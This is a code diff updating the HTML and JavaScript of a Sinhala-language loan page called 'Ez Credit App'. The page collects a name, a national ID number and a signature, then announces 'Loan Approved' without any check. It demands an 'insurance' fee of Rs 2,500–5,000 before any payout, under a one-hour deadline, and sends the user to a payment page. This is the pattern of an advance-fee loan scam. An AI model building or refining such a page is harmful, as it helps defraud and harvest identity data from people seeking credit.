@@ -2,10 +2,17 @@
 <html lang="si">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- MOBILE ZOOM FIX -->
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
 <title>Ez Credit App</title>
 
 <style>
+* {
+    box-sizing: border-box;
+}
+
 html, body {
     margin: 0;
     padding: 0;
@@ -23,17 +30,17 @@ html, body {
     flex-direction: column;
 }
 
-.header {
-    height: 0px;
-}
-
 .content {
-    padding: 20px;
+    padding: 16px;
     flex: 1;
     overflow-y: auto;
+    width: 100%;
 }
 
-h3 { text-align: center; margin-bottom: 10px; }
+h3 {
+    text-align: center;
+    margin-bottom: 12px;
+}
 
 label {
     display: block;
@@ -43,11 +50,12 @@ label {
 
 input {
     width: 100%;
-    padding: 12px;
+    padding: 14px;
     margin-top: 6px;
     border-radius: 12px;
     border: 1px solid #ccc;
-    font-size: 15px;
+    font-size: 16px; /* STOP MOBILE ZOOM */
+    display: block;
 }
 
 .statement {
@@ -59,13 +67,15 @@ input {
     line-height: 1.5;
 }
 
+/* SIGNATURE */
 canvas {
     width: 100%;
-    height: 120px;
+    height: 160px;
     border: 2px dashed #aaa;
     border-radius: 12px;
     margin-top: 8px;
     touch-action: none;
+    background: #fff;
 }
 
 button {
@@ -87,42 +97,20 @@ button {
     position: sticky;
     bottom: 0;
     background: #fff;
-    padding: 15px 0;
+    padding-top: 12px;
 }
 
 button:disabled {
     background: #bdc3c7;
-    cursor: not-allowed;
 }
 
-#page2 { display: none; }
+#page2 {
+    display: none;
+}
 
 #payNowBtn {
     background: #2980b9;
     margin-top: 10px;
-}
-
-#loading {
-    position: fixed;
-    inset: 0;
-    background: rgba(255,255,255,0.95);
-    display: none;
-    align-items: center;
-    justify-content: center;
-    z-index: 999;
-}
-
-.spinner {
-    width: 28px;
-    height: 28px;
-    border: 4px solid #ccc;
-    border-top: 4px solid #27ae60;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-    100% { transform: rotate(360deg); }
 }
 </style>
 </head>
@@ -131,95 +119,101 @@ button:disabled {
 
 <div class="app">
 
-    <!-- PAGE 01 -->
-    <div class="content" id="page1">
-        <h3>Customer Details</h3>
+<!-- PAGE 1 -->
+<div class="content" id="page1">
+    <h3>Customer Details</h3>
 
-        <label>Name</label>
-        <input id="name">
+    <label>Name</label>
+    <input id="name" autocomplete="off">
 
-        <label>NIC Number</label>
-        <input id="nic">
+    <label>NIC Number</label>
+    <input id="nic" autocomplete="off">
 
-        <label>Request Amount (Rs)</label>
-        <input type="number" id="amount">
+    <label>Request Amount (Rs)</label>
+    <input type="number" id="amount">
 
-        <div class="statement">
-            මා විසින් ලබාගන්නා මෙම මුදල, සඳහන් පොලී අනුපාතයන්ට එකඟව ගෙවන බවට මෙයින් පොරොන්දු වෙමි.
-        </div>
-
-        <label>Signature</label>
-        <canvas id="sign"></canvas>
-        <button class="clear-btn" onclick="clearSign()">Clear Signature</button>
-
-        <div class="next-wrap">
-            <button onclick="nextPage()">Next</button>
-        </div>
+    <div class="statement">
+        මා විසින් ලබාගන්නා මෙම මුදල, සඳහන් පොලී අනුපාතයන්ට එකඟව ගෙවන බවට මෙයින් පොරොන්දු වෙමි.
     </div>
 
-    <!-- PAGE 02 -->
-    <div class="content" id="page2">
-        <h3>Loan Approved</h3>
+    <label>Signature</label>
+    <canvas id="sign"></canvas>
+    <button class="clear-btn" onclick="clearSign()">Clear Signature</button>
 
-        <p><b>Requested Amount:</b> Rs. <span id="showAmount"></span></p>
-        <p><b>Insurance:</b> Rs. <span id="insurance"></span></p>
-
-        <div class="statement">
-            ඔබගේ ණය ඉල්ලීම අනුමත වී ඇත.<br><br>
-            රක්ෂණ මුදල ගෙවීමෙන් පසු පැය 1ක් ඇතුළත මුදල් ඔබගේ ගිණුමට බැර කරනු ලැබේ.
-        </div>
-
-        <label>Upload Receipt</label>
-        <input type="file" id="receipt">
-
-        <div class="next-wrap">
-            <button onclick="submitForm()">Submit</button>
-        </div>
-
-        <!-- PAYMENT SECTION (ALWAYS VISIBLE) -->
-        <div id="paymentSection" style="margin-top:10px;">
-            <p><b>Payment Deadline:</b> <span id="deadline">--:--</span></p>
-            <button id="payNowBtn" disabled>Pay Now</button>
-        </div>
+    <div class="next-wrap">
+        <button onclick="nextPage()">Next</button>
     </div>
-
 </div>
 
-<div id="loading">
-    <div class="spinner"></div>
+<!-- PAGE 2 -->
+<div class="content" id="page2">
+    <h3>Loan Approved</h3>
+
+    <p><b>Requested Amount:</b> Rs. <span id="showAmount"></span></p>
+    <p><b>Insurance:</b> Rs. <span id="insurance"></span></p>
+
+    <div class="statement">
+        ඔබගේ ණය ඉල්ලීම අනුමත වී ඇත.<br><br>
+        රක්ෂණ මුදල ගෙවීමෙන් පසු පැය 1ක් ඇතුළත මුදල් ඔබගේ ගිණුමට බැර කරනු ලැබේ.
+    </div>
+
+    <label>Upload Receipt</label>
+    <input type="file" id="receipt" accept="image/*">
+
+    <div class="next-wrap">
+        <button onclick="submitForm()">Submit</button>
+    </div>
+
+    <div style="margin-top:10px;">
+        <p><b>Payment Deadline:</b> <span id="deadline">--:--</span></p>
+        <button id="payNowBtn" disabled>Pay Now</button>
+    </div>
+</div>
+
 </div>
 
 <script>
-/* Signature */
+/* SIGNATURE */
 const c = document.getElementById("sign");
 const ctx = c.getContext("2d");
-c.width = c.offsetWidth;
-c.height = c.offsetHeight;
-let draw = false;
+
+ctx.lineWidth = 3;
+ctx.lineCap = "round";
+ctx.strokeStyle = "#000";
+
+function resizeCanvas() {
+    const ratio = window.devicePixelRatio || 1;
+    c.width = c.offsetWidth * ratio;
+    c.height = c.offsetHeight * ratio;
+    ctx.setTransform(ratio, 0, 0, ratio, 0, 0);
+}
+resizeCanvas();
+
+let drawing = false;
 
 c.addEventListener("pointerdown", e => {
-    draw = true;
+    drawing = true;
     ctx.beginPath();
     ctx.moveTo(e.offsetX, e.offsetY);
 });
 
 c.addEventListener("pointermove", e => {
-    if (!draw) return;
+    if (!drawing) return;
     ctx.lineTo(e.offsetX, e.offsetY);
     ctx.stroke();
 });
 
-c.addEventListener("pointerup", () => draw = false);
-c.addEventListener("pointerleave", () => draw = false);
+c.addEventListener("pointerup", () => drawing = false);
+c.addEventListener("pointerleave", () => drawing = false);
 
 function clearSign() {
     ctx.clearRect(0, 0, c.width, c.height);
 }
 
-/* Page change */
+/* PAGE CHANGE */
 function nextPage() {
-    const name = document.getElementById("name").value;
-    const nic = document.getElementById("nic").value;
+    const name = document.getElementById("name").value.trim();
+    const nic = document.getElementById("nic").value.trim();
     const amount = document.getElementById("amount").value;
 
     if (!name || !nic || !amount) {
@@ -234,7 +228,7 @@ function nextPage() {
     document.getElementById("insurance").innerText = calc(amount);
 }
 
-/* Insurance calc */
+/* INSURANCE CALC */
 function calc(a) {
     a = parseInt(a);
     if (a <= 60000) return "2,500";
@@ -243,31 +237,30 @@ function calc(a) {
     return "5,000";
 }
 
-/* Submit */
+/* SUBMIT */
 function submitForm() {
     const receipt = document.getElementById("receipt");
     const deadlineEl = document.getElementById("deadline");
     const payBtn = document.getElementById("payNowBtn");
 
     if (receipt.files.length === 0) {
-        alert("කරුණාකර receipt image එක upload කරන්න");
+        alert("Receipt upload කරන්න");
         return;
     }
 
     const now = new Date();
-    const oneHourLater = new Date(now.getTime() + 60 * 60 * 1000);
+    const end = new Date(now.getTime() + 60 * 60 * 1000);
 
-    const h = oneHourLater.getHours().toString().padStart(2, '0');
-    const m = oneHourLater.getMinutes().toString().padStart(2, '0');
-
-    deadlineEl.innerText = `${h}:${m} (1 hour within)`;
+    deadlineEl.innerText =
+        end.getHours().toString().padStart(2,"0") + ":" +
+        end.getMinutes().toString().padStart(2,"0");
 
     payBtn.disabled = false;
     payBtn.onclick = () => {
         window.location.href = "payment_page.html";
     };
 
-    alert("Receipt uploaded successfully. දැන් Pay Now click කර payment කරන්න.");
+    alert("Receipt uploaded. Pay Now click කරන්න.");
 }
 </script>
 
